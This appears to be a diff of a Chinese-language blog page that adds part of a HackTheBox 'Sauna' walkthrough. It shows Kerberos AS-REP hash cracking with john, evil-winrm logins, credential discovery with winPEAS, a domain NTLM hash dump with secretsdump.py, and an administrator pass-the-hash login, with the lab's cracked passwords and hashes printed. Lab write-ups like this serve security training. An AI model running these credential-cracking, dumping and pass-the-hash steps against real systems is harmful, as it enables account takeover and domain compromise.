+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~/Desktop/impacket/examples$ sudo john Sauna -wordlist=../../../rockyou.txt
+[sudo] password for kali: 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Thestrokes23     ($krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL)
+1g 0:00:00:23 DONE (2020-06-26 20:58) 0.04299g/s 453095p/s 453095c/s 453095C/s Thing..Thehunter22
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>  evil-winrm 连接</p>
+</blockquote>
+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ evil-winrm -u FSmith -p Thestrokes23 -i 10.10.10.175
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>  提权</p>
+</blockquote>
+<p>通过跑 winPEAS 发现了一个账户的密码</p>
+<p><img src="image-20200627101104314.png" alt></p>
+<p><img src="image-20200627102217085.png" alt></p>
+<p>用 FSmith 没能提取出管理员的密码 hash</p>
+<p>尝试用 svc_loanmgr 用户去提取，它看着也像个管理员…… <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" target="_blank" rel="noopener">secretsdump.py</a></p>
+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~/Desktop/impacket/examples$ python3 secretsdump.py -just-dc-ntlm EGOTISTICAL-BANK.LOCAL/SVC_LOANMGR:"Moneymakestheworldgoround!"@10.10.10.175
+Impacket v0.9.22.dev1 - Copyright 2020 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:1f2ee4dfd42ee859114f2388599d7a4b:::
+[*] Cleaning up... 
+kali@kali:~/Desktop/impacket/examples$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>成功获取管理员 hash 值，登陆</p>
+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ evil-winrm -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff -i 10.10.10.175
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
             </div>
             <hr />
@@ -703,9 +963,9 @@ root
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《MrRobot》
+                    《Sauna》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/05/19/vulnhub-mrrobot/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/06/27/sauna/" property="cc:attributionName"
                rel="cc:attributionURL">
                 ALing
             </a> 采用
@@ -1007,29 +1267,84 @@ root
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/05/20/xin-xi-shou-ji/">
+                <a href="/2020/06/27/sauna/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="信息收集">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="Sauna">
                         
-                        <span class="card-title">信息收集</span>
+                        <span class="card-title">Sauna</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            信息收集杂记，持续更新……
+                            信息收集、枚举用户、域的概念、admin passwd
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-05-20
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-06-27
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/渗透测试/" class="post-category" target="_blank">
+                                    渗透测试
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/hackthebox/" target="_blank">
+                        <span class="chip bg-color">hackthebox</span>
+                    </a>
+                    
+                    <a href="/tags/windows/" target="_blank">
+                        <span class="chip bg-color">windows</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/06/21/blunder/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Blunder">
+                        
+                        <span class="card-title">Blunder</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            wfuzz、爆破后台、msf、sudo
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-06-21
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -1045,57 +1360,8 @@ root
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/信息收集/" target="_blank">
-                        <span class="chip bg-color">信息收集</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/05/19/docker-commands/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="docker commands">
-                        
-                        <span class="card-title">docker commands</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            doker笔记，持续更新……
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-05-19
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/docker/" class="post-category" target="_blank">
-                                    docker
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/docker/" target="_blank">
-                        <span class="chip bg-color">docker</span>
+                    <a href="/tags/hackTheBox/" target="_blank">
+                        <span class="chip bg-color">hackTheBox</span>
                     </a>
                     
                 </div>
@@ -1241,6 +1507,25 @@ root
     
 
 </main>
+
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
+    });
+</script>
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
 
 
     <footer class="page-footer bg-color">
